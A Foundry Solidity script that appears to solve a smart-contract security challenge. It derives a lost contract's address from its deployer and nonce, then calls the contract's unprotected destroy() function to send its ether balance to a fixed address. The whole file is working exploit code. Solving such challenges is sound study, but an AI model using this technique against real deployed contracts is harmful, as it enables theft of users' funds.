//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

interface ISimpleToken {
    function balances(address _address) external view returns (uint);

    function destroy(address payable _to) external;
}

contract DetermineAddress is Script {
    address public a;
    ISimpleToken simpleTokenContract;

    function run() public {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(privateKey);
        a = address(
            uint160(
                uint256(
                    keccak256(
                        abi.encodePacked(
                            bytes1(0xd6),
                            bytes1(0x94),
                            address(0xB402332998cee902A2b7894850DFBE4a8eF9998b),
                            bytes1(0x01)
                        )
                    )
                )
            )
        );

        console.log("You can find the contract @:", a);
        simpleTokenContract = ISimpleToken(a);
        console.log(
            "The current balance of Simple Contract is",
            simpleTokenContract.balances(a)
        );

        simpleTokenContract.destroy(
            payable(address(0x6117AAc3b7E3D53F0A3009E70F5Ecf73F7C9AF02))
        );
        console.log(
            "The final balance of SimpleContract is",
            simpleTokenContract.balances(a)
        );
    }
}
